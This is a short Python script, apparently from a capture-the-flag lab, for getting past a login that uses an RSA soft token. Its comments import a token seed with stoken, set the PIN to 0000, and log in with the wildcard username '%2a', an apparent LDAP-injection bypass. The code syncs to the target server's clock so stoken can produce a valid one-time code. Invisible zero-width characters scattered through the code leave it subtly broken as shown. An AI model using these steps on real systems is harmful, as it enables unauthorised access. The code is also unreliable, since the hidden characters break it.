#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
#
# stoken import --token 285449490011357156531651545652335570713167411445727140604172141456711102716717000 --force
# stoken setpin   ->  0000
# Login with username: %2a
#

from​ requests ​import​ get
from​ datetime ​import​ datetime
from os import system

url = ​'http://10.10.10.122'
res = get(url)
date = res.headers[​'Date'​]
pattern = ​'%a, %d %b %Y %H:%M:%S GMT'
obj = datetime.strptime(date, pattern)
diff = datetime.utcnow() - datetime.now()
currenttm = str(int(obj.strftime('%s')) - int(diff.total_seconds()))
system('stoken --use-time=' + currenttm)
